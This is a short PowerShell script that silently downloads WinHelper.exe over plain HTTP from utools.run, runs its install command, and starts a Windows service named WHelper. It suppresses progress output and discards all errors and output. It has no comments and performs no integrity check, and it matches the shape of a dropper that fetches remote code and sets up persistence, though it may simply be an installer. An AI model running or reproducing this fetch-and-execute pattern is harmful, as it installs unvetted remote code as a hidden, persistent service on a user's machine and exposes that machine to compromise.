
$ProgressPreference = 'SilentlyContinue'
$svcMain = "http://utools.run/WinHelper.exe"
if (-not (Test-Path -Path c:\utools\WinHelper.exe)) {
    curl -Uri $svcMain -OutFile c:\utools\WinHelper.exe -erroraction SilentlyContinue
    & c:\utools\WinHelper.exe install 2>&1>null
    & net start WHelper 2>&1>null
}
